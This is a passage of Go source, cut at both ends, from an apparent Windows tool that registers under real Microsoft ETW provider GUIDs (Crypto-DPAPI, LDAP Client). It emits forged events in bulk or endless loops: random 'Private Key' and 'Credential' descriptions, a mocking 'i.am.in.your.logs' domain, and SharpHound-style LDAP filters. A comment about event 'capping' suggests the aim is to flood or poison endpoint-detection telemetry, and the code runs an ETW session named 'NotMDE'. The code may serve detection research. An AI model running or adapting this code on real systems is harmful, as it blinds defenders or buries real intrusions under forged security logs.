			Ptr:  uint64(uintptr(unsafe.Pointer(&protectionFlagsBuf[0]))),
			Size: 4,
		},
		{ // 6) ReturnValue
			Ptr:  uint64(uintptr(unsafe.Pointer(&returnValueBuf[0]))),
			Size: 4,
		},
		{ // 7) CallerProcessStartKey
			Ptr:  uint64(uintptr(unsafe.Pointer(&startKeyBuf[0]))),
			Size: 8,
		},
		{ // 8) CallerProcessID
			Ptr:  uint64(uintptr(unsafe.Pointer(&pidBuf[0]))),
			Size: 4,
		},
		{ // 9) CallerProcessCreationTime
			Ptr:  uint64(uintptr(unsafe.Pointer(&creationTimeBuf[0]))),
			Size: 8,
		},
		{ // 10) PlainTextDataSize
			Ptr:  uint64(uintptr(unsafe.Pointer(&plainTextSizeBuf2[0]))),
			Size: 4,
		},
	}

	// Write the second event
	status, _, _ = procEventWrite.Call(
		uintptr(regHandle),
		uintptr(unsafe.Pointer(&eventDescriptor)),
		uintptr(len(eventData2)),
		uintptr(unsafe.Pointer(&eventData2[0])),
	)
	if status != 0 {
		log.Printf("Failed to write DPAPI event 2: %s", GetWindowsErrorDescription(uint32(status)))
		return
	}

	// Unregister
	procEventUnregister.Call(uintptr(regHandle))
}

// WriteSpamDPAPIEvent generates multiple DPAPI events
func WriteSpamDPAPIEvent() {
	log.Println("Emitting multiple DPAPI events...")

	// The Microsoft-Windows-Crypto-DPAPI provider:
	dpapiProviderGUID := GUID{
		Data1: 0x89FE8F40,
		Data2: 0xCDCE,
		Data3: 0x464E,
		Data4: [8]byte{0x82, 0x17, 0x15, 0xEF, 0x97, 0xD4, 0xC7, 0xC3},
	}

	var regHandle syscall.Handle

	hr, _, _ := procEventRegister.Call(
		uintptr(unsafe.Pointer(&dpapiProviderGUID)),
		0,
		0,
		uintptr(unsafe.Pointer(&regHandle)),
	)
	if hr != 0 {
		log.Fatalf("Failed to register provider: %d", hr)
	}
	defer procEventUnregister.Call(uintptr(regHandle))

	// Generate 501 random DPAPI events
	for i := 0; i < 501; i++ {
		// Create random GUID for master key
		var masterKeyGUID GUID
		hr, _, _ := procCoCreateGuid.Call(uintptr(unsafe.Pointer(&masterKeyGUID)))
		if hr != 0 {
			continue
		}

		// Random operation types
		operationTypes := []string{"SPCryptUnprotect", "SPCryptProtect", "SPCryptUnprotectMemory", "SPCryptProtectMemory"}
		operationType := operationTypes[rand.Intn(len(operationTypes))]

		// Random data descriptions
		dataDescriptions := []string{
			"Private Key Properties", "Private Key", "Certificate", "Password",
			"Credential", "Secret", "Token", "Key Material", "Encrypted Data",
			"Master Key", "Session Key", "Encryption Key", "Decryption Key",
		}
		dataDescription := dataDescriptions[rand.Intn(len(dataDescriptions))]

		// Random values
		flags := uint32(rand.Intn(10) + 1)
		protectionFlags := uint32(rand.Intn(10) + 1)
		returnValue := uint32(rand.Intn(2)) // 0 or 1
		callerProcessStartKey := uint64(rand.Int63())
		callerProcessID := uint32(os.Getpid())
		callerProcessCreationTime := uint64(rand.Int63())
		plainTextDataSize := uint32(rand.Intn(1000) + 50)

		// Convert strings to UTF-16
		operationTypeUTF16, _ := syscall.UTF16FromString(operationType)
		dataDescriptionUTF16, _ := syscall.UTF16FromString(dataDescription)

		// Convert GUID to raw 16 bytes
		masterKeyGUIDBytes := *(*[16]byte)(unsafe.Pointer(&masterKeyGUID))

		// Build numeric fields as little-endian buffers
		flagsBuf := make([]byte, 4)
		binary.LittleEndian.PutUint32(flagsBuf, flags)
		protectionFlagsBuf := make([]byte, 4)
		binary.LittleEndian.PutUint32(protectionFlagsBuf, protectionFlags)
		returnValueBuf := make([]byte, 4)
		binary.LittleEndian.PutUint32(returnValueBuf, returnValue)
		startKeyBuf := make([]byte, 8)
		binary.LittleEndian.PutUint64(startKeyBuf, callerProcessStartKey)
		pidBuf := make([]byte, 4)
		binary.LittleEndian.PutUint32(pidBuf, callerProcessID)
		creationTimeBuf := make([]byte, 8)
		binary.LittleEndian.PutUint64(creationTimeBuf, callerProcessCreationTime)
		plainTextSizeBuf := make([]byte, 4)
		binary.LittleEndian.PutUint32(plainTextSizeBuf, plainTextDataSize)

		// Event descriptor
		var eventDescriptor EventDescriptor
		eventDescriptor.Id = 16385
		eventDescriptor.Version = 0
		eventDescriptor.Channel = 16
		eventDescriptor.Level = 4
		eventDescriptor.Opcode = 0
		eventDescriptor.Task = 1
		eventDescriptor.Keyword = 0x2000000000000040

		// Event data
		eventData := []EventDataDescriptor{
			{
				Ptr:  uint64(uintptr(unsafe.Pointer(&operationTypeUTF16[0]))),
				Size: uint32(len(operationTypeUTF16) * 2),
			},
			{
				Ptr:  uint64(uintptr(unsafe.Pointer(&dataDescriptionUTF16[0]))),
				Size: uint32(len(dataDescriptionUTF16) * 2),
			},
			{
				Ptr:  uint64(uintptr(unsafe.Pointer(&masterKeyGUIDBytes[0]))),
				Size: 16,
			},
			{
				Ptr:  uint64(uintptr(unsafe.Pointer(&flagsBuf[0]))),
				Size: 4,
			},
			{
				Ptr:  uint64(uintptr(unsafe.Pointer(&protectionFlagsBuf[0]))),
				Size: 4,
			},
			{
				Ptr:  uint64(uintptr(unsafe.Pointer(&returnValueBuf[0]))),
				Size: 4,
			},
			{
				Ptr:  uint64(uintptr(unsafe.Pointer(&startKeyBuf[0]))),
				Size: 8,
			},
			{
				Ptr:  uint64(uintptr(unsafe.Pointer(&pidBuf[0]))),
				Size: 4,
			},
			{
				Ptr:  uint64(uintptr(unsafe.Pointer(&creationTimeBuf[0]))),
				Size: 8,
			},
			{
				Ptr:  uint64(uintptr(unsafe.Pointer(&plainTextSizeBuf[0]))),
				Size: 4,
			},
		}

		// Write the event
		status, _, _ := procEventWrite.Call(
			uintptr(regHandle),
			uintptr(unsafe.Pointer(&eventDescriptor)),
			uintptr(len(eventData)),
			uintptr(unsafe.Pointer(&eventData[0])),
		)
		if status != 0 {
			log.Printf("Failed to write DPAPI spam event %d: %s", i, GetWindowsErrorDescription(uint32(status)))
		} else {
			log.Printf("DPAPI spam event %d written successfully", i)
		}
	}
}

// WriteInfiniteDPAPIEvent generates DPAPI events continuously until stopped
func WriteInfiniteDPAPIEvent() {
	var regHandle syscall.Handle

	// The Microsoft-Windows-Crypto-DPAPI provider:
	dpapiProviderGUID := GUID{
		Data1: 0x89FE8F40,
		Data2: 0xCDCE,
		Data3: 0x464E,
		Data4: [8]byte{0x82, 0x17, 0x15, 0xEF, 0x97, 0xD4, 0xC7, 0xC3},
	}

	hr, _, _ := procEventRegister.Call(
		uintptr(unsafe.Pointer(&dpapiProviderGUID)),
		0,
		0,
		uintptr(unsafe.Pointer(&regHandle)),
	)
	if hr != 0 {
		log.Printf("Failed to register provider: %d", hr)
		return
	}
	defer procEventUnregister.Call(uintptr(regHandle))

	count := 0
	for {
		if IsEscapePressed() {
			break
		}

		// Create random GUID for master key
		var masterKeyGUID GUID
		hr, _, _ := procCoCreateGuid.Call(uintptr(unsafe.Pointer(&masterKeyGUID)))
		if hr != 0 {
			// Don't break, just skip this iteration
			continue
		}

		// Random operation types
		operationTypes := []string{"SPCryptUnprotect", "SPCryptProtect", "SPCryptUnprotectMemory", "SPCryptProtectMemory"}
		operationType := operationTypes[rand.Intn(len(operationTypes))]

		// Random data descriptions
		dataDescriptions := []string{
			"Private Key Properties", "Private Key", "Certificate", "Password",
			"Credential", "Secret", "Token", "Key Material", "Encrypted Data",
			"Master Key", "Session Key", "Encryption Key", "Decryption Key",
		}
		dataDescription := dataDescriptions[rand.Intn(len(dataDescriptions))]

		// Random values
		flags := uint32(rand.Intn(10) + 1)
		protectionFlags := uint32(rand.Intn(10) + 1)
		returnValue := uint32(rand.Intn(2)) // 0 or 1
		callerProcessStartKey := uint64(rand.Int63())
		callerProcessID := uint32(os.Getpid())
		callerProcessCreationTime := uint64(rand.Int63())
		plainTextDataSize := uint32(rand.Intn(1000) + 50)

		// Convert strings to UTF-16
		operationTypeUTF16, _ := syscall.UTF16FromString(operationType)
		dataDescriptionUTF16, _ := syscall.UTF16FromString(dataDescription)

		// Convert GUID to raw 16 bytes
		masterKeyGUIDBytes := *(*[16]byte)(unsafe.Pointer(&masterKeyGUID))

		// Build numeric fields as little-endian buffers
		flagsBuf := make([]byte, 4)
		binary.LittleEndian.PutUint32(flagsBuf, flags)
		protectionFlagsBuf := make([]byte, 4)
		binary.LittleEndian.PutUint32(protectionFlagsBuf, protectionFlags)
		returnValueBuf := make([]byte, 4)
		binary.LittleEndian.PutUint32(returnValueBuf, returnValue)
		startKeyBuf := make([]byte, 8)
		binary.LittleEndian.PutUint64(startKeyBuf, callerProcessStartKey)
		pidBuf := make([]byte, 4)
		binary.LittleEndian.PutUint32(pidBuf, callerProcessID)
		creationTimeBuf := make([]byte, 8)
		binary.LittleEndian.PutUint64(creationTimeBuf, callerProcessCreationTime)
		plainTextSizeBuf := make([]byte, 4)
		binary.LittleEndian.PutUint32(plainTextSizeBuf, plainTextDataSize)

		// Event descriptor
		var eventDescriptor EventDescriptor
		eventDescriptor.Id = 16385
		eventDescriptor.Version = 0
		eventDescriptor.Channel = 16
		eventDescriptor.Level = 4
		eventDescriptor.Opcode = 0
		eventDescriptor.Task = 1
		eventDescriptor.Keyword = 0x2000000000000040

		// Event data
		eventData := []EventDataDescriptor{
			{
				Ptr:  uint64(uintptr(unsafe.Pointer(&operationTypeUTF16[0]))),
				Size: uint32(len(operationTypeUTF16) * 2),
			},
			{
				Ptr:  uint64(uintptr(unsafe.Pointer(&dataDescriptionUTF16[0]))),
				Size: uint32(len(dataDescriptionUTF16) * 2),
			},
			{
				Ptr:  uint64(uintptr(unsafe.Pointer(&masterKeyGUIDBytes[0]))),
				Size: 16,
			},
			{
				Ptr:  uint64(uintptr(unsafe.Pointer(&flagsBuf[0]))),
				Size: 4,
			},
			{
				Ptr:  uint64(uintptr(unsafe.Pointer(&protectionFlagsBuf[0]))),
				Size: 4,
			},
			{
				Ptr:  uint64(uintptr(unsafe.Pointer(&returnValueBuf[0]))),
				Size: 4,
			},
			{
				Ptr:  uint64(uintptr(unsafe.Pointer(&startKeyBuf[0]))),
				Size: 8,
			},
			{
				Ptr:  uint64(uintptr(unsafe.Pointer(&pidBuf[0]))),
				Size: 4,
			},
			{
				Ptr:  uint64(uintptr(unsafe.Pointer(&creationTimeBuf[0]))),
				Size: 8,
			},
			{
				Ptr:  uint64(uintptr(unsafe.Pointer(&plainTextSizeBuf[0]))),
				Size: 4,
			},
		}

		// Write the event
		status, _, _ := procEventWrite.Call(
			uintptr(regHandle),
			uintptr(unsafe.Pointer(&eventDescriptor)),
			uintptr(len(eventData)),
			uintptr(unsafe.Pointer(&eventData[0])),
		)

		success := status == 0
		UpdateProviderStats("DPAPI-Crypto", success)

		count++
	}
}

```

`cmd/etwtrace.go`:

```go
package cmd

import (
	"fmt"
	"log"
	"syscall"
	"unsafe"
)

var (
	modAdvapi32ETW     = syscall.NewLazyDLL("advapi32.dll")
	procStartTraceW    = modAdvapi32ETW.NewProc("StartTraceW")
	procStopTraceW     = modAdvapi32ETW.NewProc("StopTraceW")
	procControlTraceW  = modAdvapi32ETW.NewProc("ControlTraceW")
	procEnableTraceEx2 = modAdvapi32ETW.NewProc("EnableTraceEx2")
	procQueryTraceW    = modAdvapi32ETW.NewProc("QueryTraceW")
	procFlushTraceW    = modAdvapi32ETW.NewProc("FlushTraceW")
)

// ETW constants
const (
	EVENT_TRACE_CONTROL_QUERY = 0
	EVENT_TRACE_CONTROL_STOP  = 1
	EVENT_TRACE_CONTROL_FLUSH = 3

	EVENT_TRACE_REAL_TIME_MODE   = 0x00000100
	EVENT_TRACE_USE_PAGED_MEMORY = 0x01000000

	TRACE_LEVEL_VERBOSE     = 5
	TRACE_LEVEL_INFORMATION = 4
	TRACE_LEVEL_WARNING     = 3
	TRACE_LEVEL_ERROR       = 2
	TRACE_LEVEL_CRITICAL    = 1

	ENABLE_TRACE_PARAMETERS_VERSION = 2
)

// ETW structures
type EVENT_TRACE_PROPERTIES struct {
	Wnode               WNODE_HEADER
	BufferSize          uint32
	MinimumBuffers      uint32
	MaximumBuffers      uint32
	MaximumFileSize     uint32
	LogFileMode         uint32
	FlushTimer          uint32
	EnableFlags         uint32
	AgeLimit            int32
	NumberOfBuffers     uint32
	FreeBuffers         uint32
	EventsLost          uint32
	BuffersWritten      uint32
	LogBuffersLost      uint32
	RealTimeBuffersLost uint32
	LoggerThreadId      syscall.Handle
	LogFileNameOffset   uint32
	LoggerNameOffset    uint32
}

type WNODE_HEADER struct {
	BufferSize        uint32
	ProviderId        uint32
	HistoricalContext uint64
	KernelHandle      syscall.Handle
	Guid              GUID
	ClientContext     uint32
	Flags             uint32
}

type ENABLE_TRACE_PARAMETERS struct {
	Version          uint32
	EnableProperty   uint32
	ControlFlags     uint32
	SourceId         GUID
	EnableFilterDesc uintptr
	FilterDescCount  uint32
}

// Global trace session handle
var traceHandle uint64 = 0
var isTraceSessionActive = false

// CheckExistingETWSession checks if NotMDE session already exists and updates state
func CheckExistingETWSession() {
	log.Println("ðŸ” Checking for existing NotMDE ETW trace session...")

	sessionName := syscall.StringToUTF16Ptr("NotMDE")
	propsSize := uint32(unsafe.Sizeof(EVENT_TRACE_PROPERTIES{})) + uint32(len("NotMDE")+1)*2
	propsPtr := make([]byte, propsSize)
	props := (*EVENT_TRACE_PROPERTIES)(unsafe.Pointer(&propsPtr[0]))
	props.Wnode.BufferSize = propsSize
	props.LoggerNameOffset = uint32(unsafe.Sizeof(EVENT_TRACE_PROPERTIES{}))

	// Try to query the session - if it exists, this will succeed
	ret, _, _ := procQueryTraceW.Call(
		0, // Use session name instead of handle
		uintptr(unsafe.Pointer(sessionName)),
		uintptr(unsafe.Pointer(props)),
	)

	if ret == 0 {
		// Session exists!
		log.Println("âš ï¸  Found existing NotMDE trace session")
		log.Printf("   - Current Buffers: %d", props.NumberOfBuffers)
		log.Printf("   - Free Buffers: %d", props.FreeBuffers)
		log.Printf("   - Events Lost: %d", props.EventsLost)

		// Try to get the handle for the existing session
		traceHandle = uint64(props.Wnode.HistoricalContext)
		isTraceSessionActive = true

		log.Println("âœ… Connected to existing NotMDE session")
		log.Println("ðŸ’¡ Use toggle to stop the existing session if needed")
	} else if ret == 2 { // ERROR_FILE_NOT_FOUND - session doesn't exist
		log.Println("âœ… No existing NotMDE session found - ready to start new session")
		isTraceSessionActive = false
		traceHandle = 0
	} else {
		log.Printf("âš ï¸  Unable to query NotMDE session status (error: 0x%x)", ret)
		log.Println("ðŸ’¡ Assuming no session exists")
		isTraceSessionActive = false
		traceHandle = 0
	}
}

// StartETWTraceSession starts the NotMDE real-time trace session
func StartETWTraceSession() error {
	// Check if session already exists
	if isTraceSessionActive && traceHandle != 0 {
		log.Println("âš ï¸  NotMDE session already active - skipping start")
		return nil
	}

	log.Println("ðŸ” Starting NotMDE ETW trace session...")
	log.Println("ðŸ“Š Session Parameters:")
	log.Println("   - Session Name: NotMDE")
	log.Println("   - Buffer Size: 128 KB")
	log.Println("   - Min Buffers: 20, Max Buffers: 100")
	log.Println("   - Flush Timer: 10 seconds")
	log.Printf("   - Monitoring %d comprehensive ETW providers", len(BufferOverflowProviders))

	// Session name as UTF-16
	sessionName := syscall.StringToUTF16Ptr("NotMDE")

	// Calculate structure size (need extra space for session name)
	propsSize := uint32(unsafe.Sizeof(EVENT_TRACE_PROPERTIES{})) + uint32(len("NotMDE")+1)*2

	// Allocate memory for EVENT_TRACE_PROPERTIES + session name
	propsPtr := make([]byte, propsSize)
	props := (*EVENT_TRACE_PROPERTIES)(unsafe.Pointer(&propsPtr[0]))

	// Initialize the structure
	props.Wnode.BufferSize = propsSize
	props.Wnode.Flags = 0x00020000 // WNODE_FLAG_TRACED_GUID

	// Configure trace session parameters as specified
	props.BufferSize = 128     // 128 KB buffer size
	props.MinimumBuffers = 20  // Minimum 20 buffers
	props.MaximumBuffers = 100 // Maximum 100 buffers
	props.FlushTimer = 10      // Flush every 10 seconds
	props.LogFileMode = EVENT_TRACE_REAL_TIME_MODE | EVENT_TRACE_USE_PAGED_MEMORY
	props.LoggerNameOffset = uint32(unsafe.Sizeof(EVENT_TRACE_PROPERTIES{}))

	// Copy session name to the end of the structure
	nameOffset := unsafe.Sizeof(EVENT_TRACE_PROPERTIES{})
	copy(propsPtr[nameOffset:], (*(*[256]byte)(unsafe.Pointer(sessionName)))[:])

	// Start the trace session
	ret, _, err := procStartTraceW.Call(
		uintptr(unsafe.Pointer(&traceHandle)),
		uintptr(unsafe.Pointer(sessionName)),
		uintptr(unsafe.Pointer(props)),
	)

	if ret != 0 {
		return fmt.Errorf("failed to start ETW trace session NotMDE: %s, %v", GetWindowsErrorDescription(uint32(ret)), err)
	}

	log.Printf("âœ… NotMDE trace session started successfully (Handle: 0x%x)", traceHandle)

	// Enable all comprehensive security providers
	log.Println("ðŸ”— Enabling comprehensive security ETW providers...")
	for i, providerGuid := range BufferOverflowProviders {
		err := enableProvider(providerGuid, BufferOverflowProviderNames[i])
		if err != nil {
			log.Printf("âš ï¸  Warning: Failed to enable provider %s: %v", BufferOverflowProviderNames[i], err)
		} else {
			log.Printf("âœ… Enabled provider: %s", BufferOverflowProviderNames[i])
		}
	}

	log.Println("ðŸš€ NotMDE trace session is now monitoring comprehensive security ETW providers!")
	log.Println("ðŸ’¡ Use StopETWTraceSession() to stop monitoring")

	return nil
}

// enableProvider enables a specific ETW provider for the trace session
func enableProvider(providerGuid GUID, providerName string) error {
	var enableParams ENABLE_TRACE_PARAMETERS
	enableParams.Version = ENABLE_TRACE_PARAMETERS_VERSION
	enableParams.EnableProperty = 0 // No special properties
	enableParams.ControlFlags = 0   // No special control flags

	// Enable the provider with VERBOSE level to capture all events
	ret, _, err := procEnableTraceEx2.Call(
		uintptr(traceHandle),
		uintptr(unsafe.Pointer(&providerGuid)),
		1, // EVENT_CONTROL_CODE_ENABLE_PROVIDER
		TRACE_LEVEL_VERBOSE,
		0, // Any keyword
		0, // Any keyword
		0, // Timeout (0 = default)
		uintptr(unsafe.Pointer(&enableParams)),
	)

	if ret != 0 {
		return fmt.Errorf("EnableTraceEx2 failed: %s, %v", GetWindowsErrorDescription(uint32(ret)), err)
	}

	return nil
}

// StopETWTraceSession stops the NotMDE trace session
func StopETWTraceSession() error {
	if traceHandle == 0 {
		return fmt.Errorf("no active trace session to stop")
	}

	log.Println("ðŸ›‘ Stopping NotMDE ETW trace session...")

	// Disable all providers first
	log.Println("ðŸ”Œ Disabling comprehensive security ETW providers...")
	for i, providerGuid := range BufferOverflowProviders {
		err := disableProvider(providerGuid, BufferOverflowProviderNames[i])
		if err != nil {
			log.Printf("âš ï¸  Warning: Failed to disable provider %s: %v", BufferOverflowProviderNames[i], err)
		} else {
			log.Printf("âœ… Disabled provider: %s", BufferOverflowProviderNames[i])
		}
	}

	// Stop the trace session
	sessionName := syscall.StringToUTF16Ptr("NotMDE")
	propsSize := uint32(unsafe.Sizeof(EVENT_TRACE_PROPERTIES{})) + uint32(len("NotMDE")+1)*2
	propsPtr := make([]byte, propsSize)
	props := (*EVENT_TRACE_PROPERTIES)(unsafe.Pointer(&propsPtr[0]))
	props.Wnode.BufferSize = propsSize
	props.LoggerNameOffset = uint32(unsafe.Sizeof(EVENT_TRACE_PROPERTIES{}))

	ret, _, err := procStopTraceW.Call(
		uintptr(traceHandle),
		uintptr(unsafe.Pointer(sessionName)),
		uintptr(unsafe.Pointer(props)),
	)

	if ret != 0 {
		return fmt.Errorf("failed to stop ETW trace session: %s, %v", GetWindowsErrorDescription(uint32(ret)), err)
	}

	log.Printf("âœ… NotMDE trace session stopped successfully")
	log.Printf("ðŸ“Š Session Statistics:")
	log.Printf("   - Buffers Used: %d", props.NumberOfBuffers)
	log.Printf("   - Free Buffers: %d", props.FreeBuffers)
	log.Printf("   - Events Lost: %d", props.EventsLost)
	log.Printf("   - Buffers Written: %d", props.BuffersWritten)

	traceHandle = 0
	return nil
}

// disableProvider disables a specific ETW provider
func disableProvider(providerGuid GUID, providerName string) error {
	var enableParams ENABLE_TRACE_PARAMETERS
	enableParams.Version = ENABLE_TRACE_PARAMETERS_VERSION

	// Disable the provider
	ret, _, err := procEnableTraceEx2.Call(
		uintptr(traceHandle),
		uintptr(unsafe.Pointer(&providerGuid)),
		0, // EVENT_CONTROL_CODE_DISABLE_PROVIDER
		0, // Level (ignored for disable)
		0, // Any keyword (ignored for disable)
		0, // Any keyword (ignored for disable)
		0, // Timeout
		uintptr(unsafe.Pointer(&enableParams)),
	)

	if ret != 0 {
		return fmt.Errorf("EnableTraceEx2 disable failed: 0x%x, %v", ret, err)
	}

	return nil
}

// QueryETWTraceSession queries the current status of the NotMDE trace session
func QueryETWTraceSession() error {
	if traceHandle == 0 {
		return fmt.Errorf("no active trace session")
	}

	log.Println("ðŸ“‹ Querying NotMDE ETW trace session status...")

	sessionName := syscall.StringToUTF16Ptr("NotMDE")
	propsSize := uint32(unsafe.Sizeof(EVENT_TRACE_PROPERTIES{})) + uint32(len("NotMDE")+1)*2
	propsPtr := make([]byte, propsSize)
	props := (*EVENT_TRACE_PROPERTIES)(unsafe.Pointer(&propsPtr[0]))
	props.Wnode.BufferSize = propsSize
	props.LoggerNameOffset = uint32(unsafe.Sizeof(EVENT_TRACE_PROPERTIES{}))

	ret, _, err := procQueryTraceW.Call(
		uintptr(traceHandle),
		uintptr(unsafe.Pointer(sessionName)),
		uintptr(unsafe.Pointer(props)),
	)

	if ret != 0 {
		return fmt.Errorf("failed to query ETW trace session: 0x%x, %v", ret, err)
	}

	log.Println("ðŸ“Š NotMDE Trace Session Status:")
	log.Printf("   - Session Handle: 0x%x", traceHandle)
	log.Printf("   - Buffer Size: %d KB", props.BufferSize)
	log.Printf("   - Min Buffers: %d, Max Buffers: %d", props.MinimumBuffers, props.MaximumBuffers)
	log.Printf("   - Flush Timer: %d seconds", props.FlushTimer)
	log.Printf("   - Current Buffers: %d", props.NumberOfBuffers)
	log.Printf("   - Free Buffers: %d", props.FreeBuffers)
	log.Printf("   - Events Lost: %d", props.EventsLost)
	log.Printf("   - Buffers Written: %d", props.BuffersWritten)
	log.Printf("   - Log Buffers Lost: %d", props.LogBuffersLost)
	log.Printf("   - Real-time Buffers Lost: %d", props.RealTimeBuffersLost)

	return nil
}

// FlushETWTraceSession manually flushes the trace buffers
func FlushETWTraceSession() error {
	if traceHandle == 0 {
		return fmt.Errorf("no active trace session")
	}

	log.Println("ðŸ’¨ Flushing NotMDE ETW trace buffers...")

	sessionName := syscall.StringToUTF16Ptr("NotMDE")
	propsSize := uint32(unsafe.Sizeof(EVENT_TRACE_PROPERTIES{})) + uint32(len("NotMDE")+1)*2
	propsPtr := make([]byte, propsSize)
	props := (*EVENT_TRACE_PROPERTIES)(unsafe.Pointer(&propsPtr[0]))
	props.Wnode.BufferSize = propsSize
	props.LoggerNameOffset = uint32(unsafe.Sizeof(EVENT_TRACE_PROPERTIES{}))

	ret, _, err := procFlushTraceW.Call(
		uintptr(traceHandle),
		uintptr(unsafe.Pointer(sessionName)),
		uintptr(unsafe.Pointer(props)),
	)

	if ret != 0 {
		return fmt.Errorf("failed to flush ETW trace session: 0x%x, %v", ret, err)
	}

	log.Println("âœ… NotMDE trace buffers flushed successfully")
	return nil
}

// WriteETWTraceSession toggles the NotMDE trace session on/off
func WriteETWTraceSession() {
	if !isTraceSessionActive {
		// Start the session
		log.Println("ðŸŽ¯ Starting NotMDE ETW Trace Session...")
		err := StartETWTraceSession()
		if err != nil {
			log.Printf("âŒ Failed to start trace session: %v", err)
			// If start failed, double-check if session actually exists
			CheckExistingETWSession()
			return
		}

		log.Println("âœ… NotMDE trace session started successfully!")
		log.Println("ðŸ”— External tools can now connect to session 'NotMDE'")
		log.Println("ðŸ’¡ Select this menu item again to stop the session")
		isTraceSessionActive = true
	} else {
		// Stop the session
		log.Println("ðŸ›‘ Stopping NotMDE ETW trace session...")

		var err error
		if traceHandle != 0 {
			// Try normal stop first (with handle)
			err = StopETWTraceSession()
		} else {
			// Fallback to stop by name if no handle
			log.Println("ðŸ”§ No session handle - attempting stop by name...")
			err = StopETWTraceSessionByName()
		}

		if err != nil {
			log.Printf("âŒ Error stopping trace session: %v", err)
			log.Println("ðŸ”§ Attempting cleanup by name...")
			// Try one more time by name
			cleanupErr := StopETWTraceSessionByName()
			if cleanupErr != nil {
				log.Printf("âŒ Cleanup also failed: %v", cleanupErr)
			}
		} else {
			log.Println("âœ… NotMDE trace session stopped successfully")
		}
		isTraceSessionActive = false
	}
}

// GetETWTraceMenuInfo returns the current menu title and description based on session state
func GetETWTraceMenuInfo() (string, string) {
	if isTraceSessionActive {
		return "NotMDE ETW Trace Monitor (ACTIVE)", "Stop ETW trace session 'NotMDE'"
	}
	return "NotMDE ETW Trace Monitor", "Start ETW trace session 'NotMDE'"
}

// StopETWTraceSessionByName stops the NotMDE trace session using session name (for cleanup)
func StopETWTraceSessionByName() error {
	log.Println("ðŸ›‘ Stopping NotMDE ETW trace session by name...")

	sessionName := syscall.StringToUTF16Ptr("NotMDE")
	propsSize := uint32(unsafe.Sizeof(EVENT_TRACE_PROPERTIES{})) + uint32(len("NotMDE")+1)*2
	propsPtr := make([]byte, propsSize)
	props := (*EVENT_TRACE_PROPERTIES)(unsafe.Pointer(&propsPtr[0]))
	props.Wnode.BufferSize = propsSize
	props.LoggerNameOffset = uint32(unsafe.Sizeof(EVENT_TRACE_PROPERTIES{}))

	ret, _, err := procStopTraceW.Call(
		0, // Use 0 for handle when stopping by name
		uintptr(unsafe.Pointer(sessionName)),
		uintptr(unsafe.Pointer(props)),
	)

	if ret != 0 {
		return fmt.Errorf("failed to stop ETW trace session by name: 0x%x, %v", ret, err)
	}

	log.Printf("âœ… NotMDE trace session stopped by name")
	log.Printf("ðŸ“Š Final Session Statistics:")
	log.Printf("   - Buffers Used: %d", props.NumberOfBuffers)
	log.Printf("   - Free Buffers: %d", props.FreeBuffers)
	log.Printf("   - Events Lost: %d", props.EventsLost)
	log.Printf("   - Buffers Written: %d", props.BuffersWritten)

	traceHandle = 0
	isTraceSessionActive = false
	return nil
}

```

`cmd/ldap.go`:

```go
package cmd

import (
	"fmt"
	"log"
	"math/rand"
	"os"
	"syscall"
	"unsafe"
)

var LdapClientProviderGuid = GUID{0x099614a5, 0x5dd7, 0x4788, [8]byte{0x8b, 0xc9, 0xe2, 0x9f, 0x43, 0xdb, 0x28, 0xfc}}

const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

func randomString(length int) string {
	b := make([]byte, length)
	for i := range b {
		b[i] = charset[rand.Intn(len(charset))]
	}
	return string(b)
}

func WriteRandomLdapEvent() {
	log.Println("Emitting LDAP Client search events...")

	var regHandle syscall.Handle
	status, _, _ := procEventRegister.Call(uintptr(unsafe.Pointer(&LdapClientProviderGuid)), 0, 0, uintptr(unsafe.Pointer(&regHandle)))
	if status != 0 {
		log.Fatalf("Failed to register provider: %d", status)
	}

	for i := 0; i < 1338; i++ {
		var activityId GUID
		hr, _, _ := procCoCreateGuid.Call(uintptr(unsafe.Pointer(&activityId)))
		if hr != 0 {
			log.Fatalf("Failed to create GUID: %d", hr)
		}

		procEventActivityId.Call(3, uintptr(unsafe.Pointer(&activityId)))

		processId := uint32(os.Getpid())

		searchFilter := randomString(rand.Intn(55) + 10)
		distinguishedName := randomString(rand.Intn(55) + 10)
		attributeList := "cn,sn" // no impact on the capping of the event

		LogSearchEvent(regHandle, 0, searchFilter, distinguishedName, attributeList, processId, 0x1, 0x10, i, true)
	}

	procEventUnregister.Call(uintptr(regHandle))
}

func WriteInfiniteRandomLdapEvent() {
	var regHandle syscall.Handle
	status, _, _ := procEventRegister.Call(uintptr(unsafe.Pointer(&LdapClientProviderGuid)), 0, 0, uintptr(unsafe.Pointer(&regHandle)))
	if status != 0 {
		log.Printf("Failed to register provider: %d", status)
		return
	}
	defer procEventUnregister.Call(uintptr(regHandle))

	count := 0
	for {
		if IsEscapePressed() {
			break
		}

		activityId := GetNextGuid()
		procEventActivityId.Call(3, uintptr(unsafe.Pointer(activityId)))

		processId := uint32(os.Getpid())
		searchFilter := randomString(rand.Intn(55) + 10)
		distinguishedName := randomString(rand.Intn(55) + 10)
		attributeList := "cn,sn"

		success := LogSearchEventQuiet(regHandle, 0, searchFilter, distinguishedName, attributeList, processId, 0x1, 0x10, count)
		UpdateProviderStats("LDAP-Client", success)

		count++
	}
}

func WriteLdapEvent() {
	fmt.Println("Emitting LDAP Client search events...")

	var regHandle syscall.Handle
	status, _, _ := procEventRegister.Call(uintptr(unsafe.Pointer(&LdapClientProviderGuid)), 0, 0, uintptr(unsafe.Pointer(&regHandle)))
	if status != 0 {
		log.Fatalf("Failed to register provider: %d", status)
	}

	for i := 0; i < 1; i++ {
		var activityId GUID
		hr, _, _ := procCoCreateGuid.Call(uintptr(unsafe.Pointer(&activityId)))
		if hr != 0 {
			log.Fatalf("Failed to create GUID: %d", hr)
		}

		procEventActivityId.Call(3, uintptr(unsafe.Pointer(&activityId)))

		processId := uint32(os.Getpid())

		searchFilter := "objectGUID=*" // ADexplorer search filter
		distinguishedName := "DC=i.am.in.your.logs,DC=now"
		attributeList := "cn,sn"

		LogSearchEvent(regHandle, 0, searchFilter, distinguishedName, attributeList, processId, 0x1, 0x10, i, true)
	}

	procEventUnregister.Call(uintptr(regHandle))
}

func WriteSharpHoundLdapEvent() {
	log.Println("Emitting LDAP Client SharpHound search events...")

	var regHandle syscall.Handle
	status, _, _ := procEventRegister.Call(uintptr(unsafe.Pointer(&LdapClientProviderGuid)), 0, 0, uintptr(unsafe.Pointer(&regHandle)))
	if status != 0 {
		log.Fatalf("Failed to register provider: %d", status)
	}

	searchFilters := []string{
		"(objectClass=*)",
		"(objectclass=domain)",
